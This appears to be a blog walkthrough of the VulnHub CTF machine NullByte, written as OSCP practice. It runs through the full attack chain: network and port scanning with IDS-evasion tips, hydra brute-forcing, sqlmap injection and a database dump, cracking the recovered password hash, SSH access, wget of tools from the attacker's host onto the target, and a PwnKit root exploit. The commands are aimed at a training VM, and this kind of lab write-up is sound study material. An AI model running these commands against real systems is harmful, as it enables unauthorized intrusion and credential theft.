---
title: NullByte Walkthrough
author: alex
date: Tue 14 Nov 18:15:48 CEST 2023
categories: [Walkthroughs]
tags: [oscp, ctf, walkthroughs, vulnhub]
img_path: /assets/img/2023-11-14-nullbyte-walkthrough/
---

Today I'm hacking into **NullByte**! This is one of the many **beginner-friendly OSCP-like** CTFs of Vulnhub. So it's a great starting point for preparing the OSCP tests.

## Methodology

1. Reconnaissance
2. Enumeration
3. Exploitation
   - Gaining root access

## Tools Used

- Netdiscover
- Nmap
- Exiftool

## Recon

Let's scan the network to discover our target's IP address:

```bash
sudo netdiscover
```
And here's the output:

```
Currently scanning: 192.168.10.0/16   |   Screen View: Unique Hosts                                               
                                                                                                                 
2 Captured ARP Req/Rep packets, from 2 hosts.   Total size: 120                                                   
_____________________________________________________________________________
 IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
-----------------------------------------------------------------------------
192.168.1.1     08:00:27:2d:87:9b      1      60  PCS Systemtechnik GmbH                                          
192.168.1.48    08:00:27:4c:49:6b      1      60  PCS Systemtechnik GmbH       
``` 

After getting the IP address of the target we now need to enumerate the target for open ports and protocols. I have used **Nmap** aggressive command for that: 

```bash
sudo nmap -p- -T4 -A -O -v 192.168.1.48
```

> **IDS & FW TRIGGERING** 
> 
> In real world situations, **this scans may trigger firewalls and other network security appliances.** If you want to run a softer scan, just change `-sV` to `-sS`. Once you know the open ports, you can target them individually. Change `-T4` (speed 4) to `-T1` (slow speed, will take ages) as well. It's not undetectable but less probable. You can also use `-D` for decoy. Check the Nmap theory **[here!](/posts/oscpath-oscp-certification-guide/#port-scanning)**
{: .prompt-warning }

And the output...

```
PORT      STATE SERVICE VERSION

80/tcp    open  http    Apache httpd 2.4.10 ((Debian))
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Null Byte 00 - level 1
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS

111/tcp   open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          33720/tcp   status
|   100024  1          34821/tcp6  status
|   100024  1          46770/udp6  status
|_  100024  1          58651/udp   status

777/tcp   open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   1024 16:30:13:d9:d5:55:36:e8:1b:b7:d9:ba:55:2f:d7:44 (DSA)
|   2048 29:aa:7d:2e:60:8b:a6:a1:c2:bd:7c:c8:bd:3c:f4:f2 (RSA)
|   256 60:06:e3:64:8f:8a:6f:a7:74:5a:8b:3f:e1:24:93:96 (ECDSA)
|_  256 bc:f7:44:8d:79:6a:19:48:76:a3:e2:44:92:dc:13:a2 (ED25519)

33720/tcp open  status  1 (RPC #100024)

MAC Address: 08:00:27:4C:49:6B (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
```

Except for **port 80**, the other ports may look quite weird but for instance, **SSH** service is running on **port 777** instead of 22.

If we start open the address in our browser we can see this:

![01000111 01001111 01000100](/main.gif)

A good habit I have developed after many VMs is that images are worth analyzing. And here I was right! If we download the `.gif` and use `exiftool` on it, we get a weird string that might be a directory: `exiftool main.gif`

```
ExifTool Version Number         : 12.63
File Name                       : main.gif
Directory                       : .
File Size                       : 17 kB
File Modification Date/Time     : 2023:11:13 22:56:33+01:00
File Access Date/Time           : 2023:11:13 22:56:33+01:00
File Inode Change Date/Time     : 2023:11:13 22:56:34+01:00
File Permissions                : -rw-r--r--
File Type                       : GIF
File Type Extension             : gif
MIME Type                       : image/gif
GIF Version                     : 89a
Image Width                     : 235
Image Height                    : 302
Has Color Map                   : No
Color Resolution Depth          : 8
Bits Per Pixel                  : 1
Background Color                : 0
Comment                         : P-): kzMb5nVYJw
Image Size                      : 235x302
Megapixels                      : 0.071
```

So, let's search `http://192.168.1.48/kzMb5nVYJw`. Now we are prompted with a field asking for a key. I tried to find the answer by other means but **Brute Force** was the only way I found to keep going:

## Enumeration

```
sudo hydra 192.168.1.48 http-form-post "/kzMb5nVYJw/index.php:key=^PASS^:invalid key" -P /usr/share/wordlists/rockyou.txt -la -v
```

And we get the word **elite**. Now we are prompted with a fiend to look for employees. After looking around, I suspect that **IT IS CONNECTED TO THE DATABASE**. Let's check if **SQL Map** gives any result:

```
sudo sqlmap -u http://192.168.1.48/kzMb5nVYJw/420search.php?usrtosearch= --dbs
```

And sure it does:

```
[09:05:18] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian 8 (jessie)
web application technology: Apache 2.4.10
back-end DBMS: MySQL >= 5.5
[09:05:19] [INFO] fetching database names
available databases [5]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] phpmyadmin
[*] seth
```

Let's dump the **seth** database:

```
sudo sqlmap -u http://192.168.1.48/kzMb5nVYJw/420search.php?usrtosearch= -D seth -dump all
```

Now we get some interesting stuff:

```
Database: seth
Table: users
[2 entries]
+----+---------------------------------------------+--------+------------+
| id | pass                                        | user   | position   |
+----+---------------------------------------------+--------+------------+
| 1  | YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE | ramses | <blank>    |
| 2  | --not allowed--                             | isis   | employee   |
+----+---------------------------------------------+--------+------------+
```

Another skill I have developed: spot a **base64** string straight away! So, let's head to [CyberChef](https://gchq.github.io/CyberChef/) and decode it:

```
c6d6bd7ebf806f43c76acc3681703b81
```

Well, spotting **MD5** hashes is another valuable skill! If we decode it with [CrackStation](https://crackstation.net/):

```
omega
```

Cool! We have credentials to **SSH** into the machine: `sudo ssh ramses@192.168.1.48 -p 777`. Now we are in!

This is now routine: `cd tmp` to be able to download scripts from our machine. `sudo service apache2 start` in our machine to be reachable. And, the first script I am downloadin it is going to be **Linux Exploit Suggester**. 

```
wget 192.168.1.23/Enumeration/les.sh
```

> **COMMAND** 
> 
> Your command will be different. I have everything organized in **/var/www/html/** so it is easier to find stuff.

## Exploitation

After some enumeration, I can see that this VM is vulnerable to **[PwnKit](https://github.com/ly4k/PwnKit)**:

```
gcc -shared PwnKit.c -o PwnKit -Wl,-e,entry -fPIC

chmod 777 PwnKit

./PwnKit
```

And we get **root**! Now we can go to `/root/` and `cat` the **proof.txt**:

```
adf11c7a9e6523...

It seems that you have pwned the box, congrats. 
Now you done that I wanna talk with you. Write a walk & mail at
xly0n@sigaint.org attach the walk and proof.txt
If sigaint.org is down you may mail at nbsly0n@gmail.com


USE THIS PGP PUBLIC KEY

-----BEGIN PGP PUBLIC KEY BLOCK-----
Version: BCPG C# v1.6.1.0

[I AM NOT DISCLOSING THE PUBLIC KEY, SORRY!]

-----END PGP PUBLIC KEY BLOCK-----







